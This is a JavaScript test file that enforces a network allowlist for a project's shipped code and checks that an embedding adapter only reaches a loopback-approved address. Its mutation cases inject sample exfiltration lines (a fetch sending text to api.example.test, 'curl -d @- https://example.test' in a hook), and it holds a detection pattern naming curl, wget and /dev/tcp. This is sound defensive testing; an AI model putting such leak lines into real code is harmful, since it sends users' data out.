// test/network-allowlist.test.mjs — the repo-wide rail: who may open a connection at all.
//
// Owner decision 2026-10-13: no entry text goes to an embedding third party. The rail in
// test/embed-local-only.test.mjs watches src/embed/; this one watches EVERYTHING that ships as
// code (src/ and bin/): a `fetch`, a network-module import, `http(s).request/get`,
// `net.connect/createConnection`, `tls.connect`, `new WebSocket` may appear only in a file named
// below, with the reason it needs it. A new place is a decision for the owner, not a drive-by:
// add it here deliberately, with a reason, or the test is red.
//
// Servers that only `listen()` are listed apart: importing node:http to ANSWER is not a way out.
//
// Not covered, on purpose: assets/ (browser code; its fetch() calls are same-origin by the page's
// own design) and bench/, eval/, test/ (not shipped).
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const REPO = path.join(path.dirname(fileURLToPath(import.meta.url)), '..');

/** Files that may reach the network, what they may use, and why. */
const ALLOW = {
  'src/embed/ollama.mjs': {
    imports: ['node:http'], calls: ['http.request'],
    why: 'the one embedding adapter; its connection goes ONLY to the address src/embed/loopback.mjs approved (checked structurally below)',
  },
  'src/embed/loopback.mjs': {
    imports: ['node:net', 'node:dns/promises'], calls: [],
    why: 'isIP and the resolution of the name localhost; opens no connection',
  },
  'src/appointment-invite.mjs': {
    imports: ['node:net', 'node:tls'], calls: ['net.connect', 'tls.connect', 'fetch'],
    why: 'opt-in appointment mail (SMTP) and Google Calendar; only when configured, appointment text, not an embedding path',
  },
  'src/recallserver.mjs': {
    imports: ['node:net'], calls: ['net.connect'],
    why: 'unix-socket/named-pipe client of the local recall server (a file path, no host)',
  },
  'bin/mem-retrieve-client.mjs': {
    imports: ['node:net'], calls: ['net.connect'],
    why: 'the same local socket, from the hook side',
  },
  'src/pwa.mjs': {
    imports: [], calls: ['fetch'],
    why: 'the text of the service worker the dashboard serves to the browser: fetch(request) of the page itself, not Node code',
  },
  // Servers: they answer, they do not call out.
  'bin/mem-mcp': { imports: ['node:http'], calls: [], why: 'HTTP MCP bridge: listen() on a loopback address by default' },
  'bin/mem-serve': { imports: ['node:http'], calls: [], why: 'dashboard server: listen() on a loopback address by default' },
};

const NET_MODULES = ['http', 'https', 'http2', 'net', 'tls', 'dgram', 'dns', 'dns/promises', 'undici', 'node-fetch',
  'cross-fetch', 'axios', 'got', 'ws', 'superagent', 'request', 'socks', 'ky'];
// A module NAME counts where it is imported (`from 'x'`, `import 'x'`, `import('x')`, `require('x')`), or
// anywhere when it carries the `node:` prefix; a bare word like 'request' or 'got' in a string is a word.
const MOD_ALT = NET_MODULES.map((m) => m.replace('/', '\\/')).join('|');
const MODULE_RE = new RegExp(`(?:\\bfrom\\s*|\\bimport\\s*\\(?\\s*|\\brequire\\s*\\(\\s*)['"\`](?:node:)?(${MOD_ALT})['"\`]|['"\`]node:(${MOD_ALT})['"\`]`, 'g');
const modOf = (m) => m[1] ?? m[2];

const CALL_PATTERNS = {
  'http.request': /\b(?:http|https|http2)\s*\.\s*(?:request|get)\s*\(/,
  'net.connect': /\bnet\s*\.\s*(?:connect|createConnection)\s*\(|\bnew\s+net\s*\.\s*Socket\b/,
  'tls.connect': /\btls\s*\.\s*connect\s*\(/,
  fetch: /(?<![.\w$])fetch\s*\(|(?:\?\?|\|\||=|:)\s*(?:globalThis\.|self\.|window\.)?fetch\s*[;,)}]|\b(?:globalThis|self|window)\s*\.\s*fetch\b/,
  createRequire: /\bcreateRequire\b|\bprocess\s*\.\s*binding\b|\bmodule\s*\.\s*require\b/,
  WebSocket: /\bnew\s+WebSocket\b|\bWebSocket\s*\(|\bEventSource\s*\(/,
};

const SHELL_RE = /\bcurl\b|\bwget\b|Invoke-WebRequest|Invoke-RestMethod|\/dev\/tcp\/|\bnc\s+-/i;

const stripComments = (src) => src
  .replace(/\/\*[\s\S]*?\*\//g, '')
  .replace(/(^|[^:\\'"`])\/\/.*$/gm, '$1');

const stripShellComments = (src) => src.replace(/^\s*#.*$/gm, '');

/** The shipped files, as { 'src/x.mjs': text }. */
function shippedFiles(root = REPO) {
  const files = {};
  const walk = (rel) => {
    for (const e of fs.readdirSync(path.join(root, rel), { withFileTypes: true })) {
      const r = `${rel}/${e.name}`;
      if (e.isDirectory()) walk(r);
      else if (e.isFile()) files[r] = fs.readFileSync(path.join(root, r), 'utf8');
    }
  };
  for (const d of ['src', 'bin', 'hooks', 'install']) if (fs.existsSync(path.join(root, d))) walk(d);
  return files;
}

const isJs = (rel, text) => /\.(mjs|js|cjs)$/.test(rel) || (!path.extname(rel) && /^#!.*\bnode\b/.test(text));
const isShell = (rel, text) => /\.(sh|ps1|bash)$/.test(rel) || (!path.extname(rel) && /^#!.*\b(ba)?sh\b/.test(text));

/** Findings over a { rel: text } map; empty means clean. */
function findings(files, allow = ALLOW) {
  const found = [];
  for (const [rel, text] of Object.entries(files)) {
    if (isJs(rel, text)) {
      const code = stripComments(text);
      const rule = allow[rel] ?? { imports: [], calls: [] };
      for (const m of code.matchAll(MODULE_RE)) {
        const spec = `node:${modOf(m)}`;
        const ok = rule.imports.includes(spec) || (!NET_MODULES.slice(0, 8).includes(modOf(m)) && rule.imports.includes(modOf(m)));
        if (!ok) found.push(`${rel}: '${modOf(m)}' is a network module and this file is not on the allowlist for it`);
      }
      for (const [kind, re] of Object.entries(CALL_PATTERNS)) {
        if (re.test(code) && !rule.calls.includes(kind)) found.push(`${rel}: ${kind} is used and this file is not on the allowlist for it`);
      }
    } else if (isShell(rel, text) && SHELL_RE.test(stripShellComments(text))) {
      found.push(`${rel}: a shell/PowerShell line reaches for curl/wget/Invoke-WebRequest/tcp`);
    }
  }
  // An allowlist entry must still be needed: a stale one is a hole waiting for use.
  for (const [rel, rule] of Object.entries(allow)) {
    const text = files[rel];
    if (text === undefined) { found.push(`${rel}: on the allowlist but missing`); continue; }
    const code = stripComments(text);
    for (const spec of rule.imports) {
      const bare = spec.replace(/^node:/, '');
      if (![...code.matchAll(MODULE_RE)].some((m) => modOf(m) === bare)) found.push(`${rel}: allowlisted import '${spec}' is not used any more — drop it from the allowlist`);
    }
    for (const kind of rule.calls) {
      if (!CALL_PATTERNS[kind].test(code)) found.push(`${rel}: allowlisted call ${kind} is not used any more — drop it from the allowlist`);
    }
    if (!rule.why) found.push(`${rel}: an allowlist entry needs a reason`);
  }
  return found;
}

/**
 * The embedding adapter's one connection must go to the address the loopback check approved. The
 * generic scan cannot tell `host: target.address` from `host: whatever`, so this reads the shape.
 */
function ollamaShapeFindings(code) {
  const c = stripComments(code);
  const out = [];
  const reqs = [...c.matchAll(/\bhttp\s*\.\s*request\s*\(\s*\{([\s\S]*?)\}\s*,/g)];
  if (reqs.length !== 1) out.push(`ollama.mjs: expected exactly one http.request({...}, cb), found ${reqs.length}`);
  for (const r of reqs) {
    if (!/\bhost\s*:\s*target\.address\s*[,\n]/.test(r[1])) out.push('ollama.mjs: the request host is not exactly target.address');
    if (!/\bport\s*:\s*target\.port\s*[,\n]/.test(r[1])) out.push('ollama.mjs: the request port is not exactly target.port');
    if (/\b(?:hostname|href|url|socketPath|lookup|createConnection)\s*:/.test(r[1])) out.push('ollama.mjs: the request carries a second way to name its destination');
  }
  if (!/const\s+target\s*=\s*await\s+checkEndpoint\s*\(/.test(c)) out.push('ollama.mjs: target does not come from checkEndpoint()');
  if (!/if\s*\(\s*!target\.ok\s*\)\s*\{[\s\S]*?throw\s/.test(c)) out.push('ollama.mjs: a refused target does not throw before the request');
  const iCheck = c.search(/checkEndpoint\s*\(/);
  const iReq = c.search(/\bawait\s+post\s*\(\s*target\b/);
  if (iCheck < 0 || iReq < 0 || iCheck > iReq) out.push('ollama.mjs: the request is made before the check');
  return out;
}

const real = shippedFiles();

test('network rail: only the named files reach for the network, and each for what it says', () => {
  assert.ok(Object.keys(real).length > 150, 'the scan found almost nothing — it is not looking');
  assert.deepEqual(findings(real), []);
});

test('network rail: the embedding adapter connects only to the approved address', () => {
  assert.deepEqual(ollamaShapeFindings(real['src/embed/ollama.mjs']), []);
});

test('network rail, red proof: each mutation of the real files is caught', () => {
  const mutate = (rel, fn) => ({ ...real, [rel]: fn(real[rel]) });
  const appended = (rel, add) => mutate(rel, (t) => `${t}\n${add}\n`);
  const cases = [
    ['fetch in hybrid.mjs', appended('src/hybrid.mjs', "export const leak = (t) => fetch('https://api.example.test/embed', { body: t });")],
    ['fetch in embed-hook.mjs', appended('src/embed-hook.mjs', "export const leak = (t) => fetch('https://api.example.test/embed', { body: t });")],
    ['fetch as a value (aliased)', appended('src/hybrid.mjs', 'const f = globalThis.fetch;')],
    ['fetch as a default parameter', appended('src/embed/index.mjs', 'export const g = (f = fetch) => f;')],
    ['https import in any module', mutate('src/memory.mjs', (t) => `import https from 'node:https';\n${t}`)],
    ['http import in the embed hook', mutate('src/embed-hook.mjs', (t) => `import http from 'node:http';\n${t}`)],
    ['dynamic import of a net module', appended('src/hybrid.mjs', "export const d = () => import('node:net');")],
    ['createRequire (loads a module by a computed name)', appended('src/hybrid.mjs', "import { createRequire } from 'node:module';\nexport const r = createRequire(import.meta.url)('http');")],
    ['http.get in a server file', appended('bin/mem-serve', "http.get('http://example.test');")],
    ['net.createConnection', appended('src/memory.mjs', "import('node:net').then((net) => net.createConnection(80, 'example.test'));")],
    ['tls.connect in a new file', { ...real, 'src/newthing.mjs': "import tls from 'node:tls';\nexport const c = () => tls.connect(443, 'example.test');\n" }],
    ['a new file with a third-party client', { ...real, 'src/newthing.mjs': "import axios from 'axios';\nexport default axios;\n" }],
    ['WebSocket', appended('src/hybrid.mjs', "export const w = () => new WebSocket('wss://example.test');")],
    ['curl in a hook script', { ...real, 'hooks/pre-commit': `${real['hooks/pre-commit'] ?? '#!/usr/bin/env bash\n'}\ncurl -d @- https://example.test\n` }],
    ['an unused allowlist entry (stale hole)', mutate('src/recallserver.mjs', (t) => t.replace(/net\.connect/g, 'net_connect'))],
  ];
  for (const [name, files] of cases) {
    assert.notDeepEqual(findings(files), [], `mutation not caught: ${name}`);
  }
  // Control: the unmutated tree is clean (so the above is the mutation, not noise).
  assert.deepEqual(findings(real), []);
  // A comment is not a call.
  assert.deepEqual(findings(appended('src/hybrid.mjs', "// fetch('https://example.test') was removed on purpose")), []);
});

test('network rail, red proof: every way of bending the embedding adapter\'s destination is caught', () => {
  const src = real['src/embed/ollama.mjs'];
  const mutations = [
    ['host from a variable', (t) => t.replace('host: target.address', 'host: wanted')],
    ['host from the raw env', (t) => t.replace('host: target.address', 'host: process.env.OLLAMA_HOST')],
    ['port from elsewhere', (t) => t.replace('port: target.port', 'port: 11434')],
    ['a second destination field', (t) => t.replace('method: \'POST\',', "method: 'POST', hostname: wanted,")],
    ['the check dropped', (t) => t.replace(/const target = await checkEndpoint\(wanted\);/, 'const target = { ok: true, address: wanted, port: 80 };')],
    ['the throw on refusal dropped', (t) => t.replace(/if \(!target\.ok\) \{[\s\S]*?throw err;\s*\}/, '')],
    ['a second request', (t) => `${t}\nexport const x = (o) => http.request({ host: o, port: 80 }, () => {});\n`],
  ];
  assert.deepEqual(ollamaShapeFindings(src), [], 'control');
  for (const [name, fn] of mutations) {
    const mutated = fn(src);
    assert.notEqual(mutated, src, `mutation did not change the file (stale anchor): ${name}`);
    assert.notDeepEqual(ollamaShapeFindings(mutated), [], `mutation not caught: ${name}`);
  }
});
